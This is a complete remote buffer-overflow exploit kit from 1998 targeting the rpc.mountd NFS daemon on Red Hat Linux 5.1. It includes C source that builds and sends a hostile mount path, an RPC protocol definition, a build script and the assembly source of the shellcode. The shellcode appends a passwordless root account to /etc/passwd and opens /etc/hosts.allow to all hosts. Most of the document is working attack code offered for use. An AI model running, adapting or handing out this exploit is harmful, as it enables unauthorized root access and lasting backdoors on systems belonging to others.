/*
    rpc.mountd [remote] exploit by LucySoft [ luci@transart.ro ]

    [September 20, 1998]
    [version 0.4]

    tested on Red Hat Linux 5.1 (Manhattan)
    running nfs-server-2.2beta29

    I guess patches are available at ftp://ftp.redhat.com

    NOTE: if the remote host has /etc/exporfs non-empty,
    [shwomount -e remote_host]
    you must define __EXPORTS 2 and recompile

    I've tested on only two RH 5.1 systems, the offset was about 1000.

*/

#define __EXPORTFS      1


#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <rpc/pmap_prot.h>
#include <rpc/pmap_clnt.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <linux/nfs.h>

#include "nfsmount.h"



static unsigned long            __offset = 1160;

/*
   check out code.c if you want to know what this means
*/

static char code[] =
{
    0xeb, 0x56, 0x5e, 0x56,
    0x56, 0x56, 0x31, 0xd2,
    0x88, 0x56, 0x0b, 0x88,
    0x56, 0x1e, 0x88, 0x56,

    0x27, 0x88, 0x56, 0x38,
    0xb2, 0x0a, 0x88, 0x56,
    0x1d, 0x88, 0x56, 0x26,
    0x5b, 0x31, 0xc9, 0x41,

    0x41, 0x31, 0xc0, 0xb0,
    0x05, 0xcd, 0x80, 0x50,
    0x89, 0xc3, 0x31, 0xc9,
    0x31, 0xd2, 0xb2, 0x02,

    0x31, 0xc0, 0xb0, 0x13,
    0xcd, 0x80, 0x58, 0x89,
    0xc2, 0x89, 0xc3, 0x59,
    0x52, 0x31, 0xd2, 0xb2,

    0x0c, 0x01, 0xd1, 0xb2,
    0x13, 0x31, 0xc0, 0xb0,
    0x04, 0x31, 0xd2, 0xb2,
    0x12, 0xcd, 0x80, 0x5b,

    0x31, 0xc0, 0xb0, 0x06,
    0xcd, 0x80, 0xeb, 0x3f,
    0xe8, 0xa5, 0xff, 0xff,
    0xff, 0x2f, 0x65, 0x74,

    0x63, 0x2f, 0x70, 0x61,
    0x73, 0x73, 0x77, 0x64,
    0x78, 0x7a, 0x3a, 0x3a,
    0x30, 0x3a, 0x30, 0x3a,

    0x3a, 0x2f, 0x3a, 0x2f,
    0x62, 0x69, 0x6e, 0x2f,
    0x73, 0x68, 0x78, 0x78,
    0x41, 0x4c, 0x4c, 0x3a,

    0x41, 0x4c, 0x4c, 0x78,
    0x78, 0x2f, 0x65, 0x74,
    0x63, 0x2f, 0x68, 0x6f,
    0x73, 0x74, 0x73, 0x2e,

    0x61, 0x6c, 0x6c, 0x6f,
    0x77, 0x78, 0xff, 0x5b,
    0x53, 0x31, 0xc9, 0xb1,
    0x28, 0x01, 0xcb, 0xb1,

    0x02, 0x31, 0xc0, 0xb0,
    0x05, 0xcd, 0x80, 0x50,
    0x89, 0xc3, 0x31, 0xc9,
    0x31, 0xd2, 0xb2, 0x02,

    0x31, 0xc0, 0xb0, 0x13,
    0xcd, 0x80, 0x5b, 0x59,
    0x53, 0x31, 0xd2, 0xb2,
    0x1f, 0x01, 0xd1, 0xb2,

    0x08, 0x31, 0xc0, 0xb0,
    0x04, 0xcd, 0x80, 0x5b,
    0x31, 0xc0, 0xb0, 0x06,
    0xcd, 0x80, 0x31, 0xc0,
    0x40, 0xcd, 0x80
};



unsigned long get_esp()
{
   __asm__("movl %esp,%eax");
}


void _fill_hostile_buffer(char *ptr)
{
    char        *buff;
    unsigned    retaddr = get_esp() + __offset;
    int         length;

    memset(ptr, 0x90, 1024);

    length = strlen(code);

    memcpy(ptr + 1024 - length - 40 - __EXPORTFS, code, length);
    buff = ptr + 1024 - 40 - __EXPORTFS;

    while (buff < (ptr + 1024))
    {
        *(unsigned*)buff = (unsigned)retaddr;
        buff += sizeof(unsigned);
    }
    ptr[1023] = '\0';

    fprintf(stderr, "code length = %d, used retaddr is %x\n", length,
retaddr);

}

/*
    ripped off from nfsmount.c [ mount-2.7l.rpm - RH 5.1 ]
*/


int _nfsmount(char* hostname, char *dirname)
{
        CLIENT  *mclient;
        int     mountprog, mountvers;
        int     nfsprog, nfsvers;
        int     mountport = 0;
        int     clnt_stat;
        int     msock, fsock;

        struct  hostent *hp;
        struct  sockaddr_in server_addr;
        struct  fhstatus status;
        struct  timeval total_timeout, retry_timeout;



        if (!(hp = gethostbyname(hostname)))
        {
            fprintf(stderr, "mx: can't get address for %s\n", hostname);
            return(-1);
        }


        server_addr.sin_family = AF_INET;
        memcpy(&server_addr.sin_addr, hp->h_addr, hp->h_length);

        mountprog = MOUNTPROG;
        mountvers = MOUNTVERS;

        nfsprog = NFS_PROGRAM;
        nfsvers = NFS_VERSION;

        total_timeout.tv_usec = 0;
        total_timeout.tv_sec = 20;

        retry_timeout.tv_usec = 0;
        retry_timeout.tv_sec = 3;

        server_addr.sin_port = htons(mountport);
        msock = RPC_ANYSOCK;

        fprintf(stderr, "ok, attacking target %s\n", hp->h_name);

        mclient = clntudp_create(&server_addr,
            mountprog, mountvers,
            retry_timeout, &msock);

        if (mclient)
        {
            mclient->cl_auth = authunix_create_default();
            clnt_stat = clnt_call(mclient, MOUNTPROC_MNT,
                (xdrproc_t) xdr_dirpath, (caddr_t) &dirname,
                (xdrproc_t) xdr_fhstatus, (caddr_t) &status,
                total_timeout);

            if (clnt_stat != RPC_SUCCESS)
            {
                /*

                auth_destroy(mclient->cl_auth);
                clnt_destroy(mclient);
                close(msock);

                clnt_perror(mclient, "mx clnt_call");
                */
                return(msock);
            }
            fprintf(stderr, "successful clnt_call\n");
            return(msock);
        }
        else
        {
            clnt_pcreateerror("mx clntudp_create");
            return(-1);
        }


        auth_destroy(mclient->cl_auth);
        clnt_destroy(mclient);
        close(msock);
        return (-1);
}


int main(int argc, char *argv[])
{
    int         k, sock;
    char        hostilebuffer[4096];


    if (argc < 2)
    {
        fprintf(stderr, "usage : %s target_host [offset]\n", argv[0]);
        return(-1);
    }

    if (argc == 3)
    {
        __offset = strtol(argv[2], (char**)NULL, 10);
        fprintf(stderr, "using offset %d\n", __offset);
    }

    _fill_hostile_buffer(hostilebuffer);
    if (_nfsmount(argv[1], hostilebuffer) > 0)
    {
        fprintf(stderr, "seems that security on host %s was defeated\n",
            argv[1]);
    }

    return(0);
}


-------------------------------------------------------------------------
CUT_HERE next file is nfsmount.x
-------------------------------------------------------------------------

%/*
% * Sun RPC is a product of Sun Microsystems, Inc. and is provided for
% * unrestricted use provided that this legend is included on all tape
% * media and as a part of the software program in whole or part.  Users
% * may copy or modify Sun RPC without charge, but are not authorized
% * to license or distribute it to anyone else except as part of a product
or
% * program developed by the user or with the express written consent of
% * Sun Microsystems, Inc.
% *
% * SUN RPC IS PROVIDED AS IS WITH NO WARRANTIES OF ANY KIND INCLUDING THE
% * WARRANTIES OF DESIGN, MERCHANTIBILITY AND FITNESS FOR A PARTICULAR
% * PURPOSE, OR ARISING FROM A COURSE OF DEALING, USAGE OR TRADE PRACTICE.
% *
% * Sun RPC is provided with no support and without any obligation on the
% * part of Sun Microsystems, Inc. to assist in its use, correction,
% * modification or enhancement.
% *
% * SUN MICROSYSTEMS, INC. SHALL HAVE NO LIABILITY WITH RESPECT TO THE
% * INFRINGEMENT OF COPYRIGHTS, TRADE SECRETS OR ANY PATENTS BY SUN RPC
% * OR ANY PART THEREOF.
% *
% * In no event will Sun Microsystems, Inc. be liable for any lost revenue
% * or profits or other special, indirect and consequential damages, even
if
% * Sun has been advised of the possibility of such damages.
% *
% * Sun Microsystems, Inc.
% * 2550 Garcia Avenue
% * Mountain View, California  94043
% */

%/*
% * Copyright (c) 1985, 1990 by Sun Microsystems, Inc.
% */
%
%/* from @(#)mount.x    1.3 91/03/11 TIRPC 1.0 */

/*
 * Protocol description for the mount program
 */

#ifdef RPC_HDR
%#ifndef _rpcsvc_mount_h
%#define _rpcsvc_mount_h
#endif

#ifdef RPC_CLNT
%#include <string.h>            /* for memset() */
#endif

const MNTPATHLEN = 1024;        /* maximum bytes in a pathname argument */
const MNTNAMLEN = 255;          /* maximum bytes in a name argument */
const FHSIZE = 32;              /* size in bytes of a file handle */

/*
 * The fhandle is the file handle that the server passes to the client.
 * All file operations are done using the file handles to refer to a file
 * or a directory. The file handle can contain whatever information the
 * server needs to distinguish an individual file.
 */
typedef opaque fhandle[FHSIZE];

/*
 * If a status of zero is returned, the call completed successfully, and
 * a file handle for the directory follows. A non-zero status indicates
 * some sort of error. The status corresponds with UNIX error numbers.
 */
union fhstatus switch (unsigned fhs_status) {
case 0:
        fhandle fhs_fhandle;
default:
        void;
};

/*
 * The type dirpath is the pathname of a directory
 */
typedef string dirpath<MNTPATHLEN>;

/*
 * The type name is used for arbitrary names (hostnames, groupnames)
 */
typedef string name<MNTNAMLEN>;

/*
 * A list of who has what mounted
 */
typedef struct mountbody *mountlist;
struct mountbody {
        name ml_hostname;
        dirpath ml_directory;
        mountlist ml_next;
};

/*
 * A list of netgroups
 */
typedef struct groupnode *groups;
struct groupnode {
        name gr_name;
        groups gr_next;
};

/*
 * A list of what is exported and to whom
 */
typedef struct exportnode *exports;
struct exportnode {
        dirpath ex_dir;
        groups ex_groups;
        exports ex_next;
};

/*
 * POSIX pathconf information
 */
struct ppathcnf {
        int     pc_link_max;    /* max links allowed */
        short   pc_max_canon;   /* max line len for a tty */
        short   pc_max_input;   /* input a tty can eat all at once */
        short   pc_name_max;    /* max file name length (dir entry) */
        short   pc_path_max;    /* max path name length (/x/y/x/.. ) */
        short   pc_pipe_buf;    /* size of a pipe (bytes) */
        u_char  pc_vdisable;    /* safe char to turn off c_cc[i] */
        char    pc_xxx;         /* alignment padding; cc_t == char */
        short   pc_mask[2];     /* validity and boolean bits */
};

program MOUNTPROG {
        /*
         * Version one of the mount protocol communicates with version two
         * of the NFS protocol. The only connecting point is the fhandle
         * structure, which is the same for both protocols.
         */
        version MOUNTVERS {
                /*
                 * Does no work. It is made available in all RPC services
                 * to allow server reponse testing and timing
                 */
                void
                MOUNTPROC_NULL(void) = 0;

                /*
                 * If fhs_status is 0, then fhs_fhandle contains the
                 * file handle for the directory. This file handle may
                 * be used in the NFS protocol. This procedure also adds
                 * a new entry to the mount list for this client mounting
                 * the directory.
                 * Unix authentication required.
                 */
                fhstatus
                MOUNTPROC_MNT(dirpath) = 1;

                /*
                 * Returns the list of remotely mounted filesystems. The
                 * mountlist contains one entry for each hostname and
                 * directory pair.
                 */
                mountlist
                MOUNTPROC_DUMP(void) = 2;

                /*
                 * Removes the mount list entry for the directory
                 * Unix authentication required.
                 */
                void
                MOUNTPROC_UMNT(dirpath) = 3;

                /*
                 * Removes all of the mount list entries for this client
                 * Unix authentication required.
                 */
                void
                MOUNTPROC_UMNTALL(void) = 4;

                /*
                 * Returns a list of all the exported filesystems, and
which
                 * machines are allowed to import it.
                 */
                exports
                MOUNTPROC_EXPORT(void)  = 5;

                /*
                 * Identical to MOUNTPROC_EXPORT above
                 */
                exports
                MOUNTPROC_EXPORTALL(void) = 6;
        } = 1;

        /*
         * Version two of the mount protocol communicates with version two
         * of the NFS protocol.
         * The only difference from version one is the addition of a POSIX
         * pathconf call.
         */
        version MOUNTVERS_POSIX {
                /*
                 * Does no work. It is made available in all RPC services
                 * to allow server reponse testing and timing
                 */
                void
                MOUNTPROC_NULL(void) = 0;

                /*
                 * If fhs_status is 0, then fhs_fhandle contains the
                 * file handle for the directory. This file handle may
                 * be used in the NFS protocol. This procedure also adds
                 * a new entry to the mount list for this client mounting
                 * the directory.
                 * Unix authentication required.
                 */
                fhstatus
                MOUNTPROC_MNT(dirpath) = 1;

                /*
                 * Returns the list of remotely mounted filesystems. The
                 * mountlist contains one entry for each hostname and
                 * directory pair.
                 */
                mountlist
                MOUNTPROC_DUMP(void) = 2;

                /*
                 * Removes the mount list entry for the directory
                 * Unix authentication required.
                 */
                void
                MOUNTPROC_UMNT(dirpath) = 3;

                /*
                 * Removes all of the mount list entries for this client
                 * Unix authentication required.
                 */
                void
                MOUNTPROC_UMNTALL(void) = 4;

                /*
                 * Returns a list of all the exported filesystems, and
which
                 * machines are allowed to import it.
                 */
                exports
                MOUNTPROC_EXPORT(void)  = 5;

                /*
                 * Identical to MOUNTPROC_EXPORT above
                 */
                exports
                MOUNTPROC_EXPORTALL(void) = 6;

                /*
                 * POSIX pathconf info (Sun hack)
                 */
                ppathcnf
                MOUNTPROC_PATHCONF(dirpath) = 7;
        } = 2;
} = 100005;

#ifdef RPC_HDR
%#endif /*!_rpcsvc_mount_h*/
#endif


------------------------------------------------------------------------
CUT_HERE : next file is makeit [ script for building the stuff ]
------------------------------------------------------------------------

#!/bin/bash

rpcgen -C nfsmount.x
gcc -c -g nfsmount.c
gcc -o mx nfsmount.o nfsmount_xdr.c

---------------------------------------------------------------------------
CUT_HERE : next file is the asm code... just to have the entire source
code
---------------------------------------------------------------------------

/*

  really ugly code. It does :

  int fd = open("/etc/passwd", O_RDWR);
  lseek(fd, 0, SEEK_END);
  write(fd, "z::0:0::/:/bin/sh\n", 18);
  close(fd);

  int fd = open("/etc/hosts.allow", O_RDWR);
  lseek(fd, 0, SEEK_END);
  write(fd, "ALL:ALL\n", 8);
  close(fd);

  exit(?);

*/

#include <stdio.h>

main()
{
    __asm__("jmp eofcode
            here:
            popl %esi
            pushl %esi
            pushl %esi
            pushl %esi

            xorl %edx, %edx
            movb %dl, 11(%esi)
            movb %dl, 30(%esi)
            movb %dl, 39(%esi)
            movb %dl, 56(%esi)
            movb $0x0a, %dl
            movb %dl, 29(%esi)
            movb %dl, 38(%esi)
            popl %ebx
            xorl %ecx, %ecx
            incl %ecx
            incl %ecx
            xor %eax, %eax
            movb $0x05, %al
            int  $0x80

            pushl %eax

            movl %eax, %ebx
            xorl %ecx, %ecx
            xorl %edx, %edx
            movb $0x02, %dl
            xorl %eax, %eax
            movb $0x13, %al
            int  $0x80

            popl %eax

            movl %eax, %edx
            movl %eax, %ebx
            popl %ecx
            pushl %edx
            xorl %edx, %edx
            movb $0x0c, %dl
            addl %edx, %ecx
            movb $0x13, %dl
            xorl %eax, %eax
            movb $0x04, %al
            xorl %edx, %edx
            movb $0x12, %dl
            int  $0x80

            popl %ebx
            xorl %eax, %eax
            movb $0x06, %al
            int  $0x80

            jmp  cont1


            eofcode:
            call here
            .string
\"/etc/passwdxz::0:0::/:/bin/shxxALL:ALLxx/etc/hosts.allowx\"

            cont1:

            popl %ebx
            pushl %ebx
            xorl %ecx, %ecx
            movb $40, %cl
            addl %ecx, %ebx
            movb $02, %cl
            xor  %eax, %eax
            movb $05, %al
            int  $0x80


            pushl %eax

            movl %eax, %ebx
            xorl %ecx, %ecx
            xorl %edx, %edx
            movb $0x02, %dl
            xorl %eax, %eax
            movb $0x13, %al
            int  $0x80

            popl %ebx

            popl %ecx

            pushl %ebx

            xorl %edx, %edx
            movb $31, %dl
            addl %edx, %ecx
            movb $8, %dl
            xorl %eax, %eax
            movb $4, %al
            int  $0x80


            popl %ebx
            xorl %eax, %eax
            movb $0x06, %al
            int  $0x80

            xor  %eax, %eax
            incl %eax
            int  $0x80

            .string \"theeeeeeeeeeend\"
            ");

}
